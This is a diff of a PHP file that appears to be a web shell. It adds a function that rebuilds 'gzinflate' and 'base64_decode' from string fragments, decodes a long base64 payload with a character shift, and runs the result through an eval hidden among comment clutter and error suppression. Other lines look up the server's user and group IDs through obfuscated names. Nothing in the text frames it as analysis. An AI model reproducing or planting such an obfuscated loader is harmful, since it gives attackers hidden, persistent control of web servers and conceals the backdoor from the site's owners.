@@ -4,7 +4,18 @@
 //Kontol Lu Semua
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
-
+function Ikg($vHjCLy){
+    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
+    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
+    $nelrts = 's'.'tr'.'l'.'en';
+    $rhc = 'c'.'h'.'r';
+    $dro = 'o'.'r'.'d';
+    $vHjCLy=$gflate($b64($vHjCLy));
+     for($i=0;$i<$nelrts($vHjCLy);$i++){
+        $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
+     }
+     return $vHjCLy;
+}/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
 //get uid:user gid:group
 $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
 $psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
